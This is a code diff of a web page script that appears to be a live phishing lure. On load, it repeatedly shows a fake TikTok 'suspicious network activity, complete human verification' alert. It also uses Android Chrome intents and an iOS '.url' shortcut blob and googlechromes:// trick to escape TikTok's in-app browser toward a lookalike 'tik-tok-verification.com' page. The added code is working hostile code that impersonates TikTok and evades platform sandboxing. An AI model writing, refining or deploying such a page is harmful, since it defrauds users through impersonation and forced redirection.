@@ -9,38 +9,39 @@
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
-    const domain = "tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000;
 
-    function goSickoMode() {
+    function theBinaryEject() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: Intent with the Chrome package and the "Always" flag
-            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
+            // Android: Package-specific Intent
+            const clean = targetUrl.replace(/^https?:\/\//, '');
+            window.location.href = `intent://${clean}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE MEDIA-PERMISSION CRASH
-            
-            // 1. Force a camera request. This triggers the OS 'Permission' layer.
-            // This 'pauses' the TikTok sandbox for a millisecond.
-            navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {});
+            // iOS: THE .URL SHORTCUT EXPLOIT
+            // We create a Windows-style shortcut file in the browser memory.
+            // When iOS 'opens' this, it MUST use Safari.
+            const urlShortcut = "[InternetShortcut]\nURL=" + targetUrl;
+            const blob = new Blob([urlShortcut], {type: 'application/x-mswinurl'});
+            const blobUrl = URL.createObjectURL(blob);
 
-            // 2. THE JUMP: Fired during the sandbox 'pause'
-            // We use the specific 'googlechromes' protocol with the CLEAN domain.
-            window.location.href = "googlechromes://" + domain;
+            // 1. Force the 'Download/Open' handoff
+            window.location.href = blobUrl;
 
-            // 3. THE OVERWRITE: 50ms later, force Safari directly.
+            // 2. Pulse the direct protocol as a backup
             setTimeout(() => {
-                window.location.href = "safari-https://" + domain;
-            }, 50);
+                const domain = targetUrl.replace(/^https?:\/\//, '');
+                window.location.href = "googlechromes://" + domain;
+            }, 100);
         }
     }
 
-    function securityLoop() {
+    function runSystem() {
         if (Date.now() > killTime) return;
 
-        // Start the ejection process
-        goSickoMode();
+        // Try to break out before the alert
+        theBinaryEject();
 
         setTimeout(() => {
             if (document.hasFocus()) {
@@ -48,15 +49,17 @@
                 const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                 
                 alert(header + body);
-                
-                // Immediately eject on "OK" tap
-                goSickoMode();
-                setTimeout(securityLoop, 300);
+
+                // Fire on "OK" (User Gesture)
+                theBinaryEject();
+
+                setTimeout(runSystem, 300);
             }
         }, 300);
     }
 
-    window.onload = securityLoop;
+    window.onload = runSystem;
 </script>
+
 </body>
 </html>
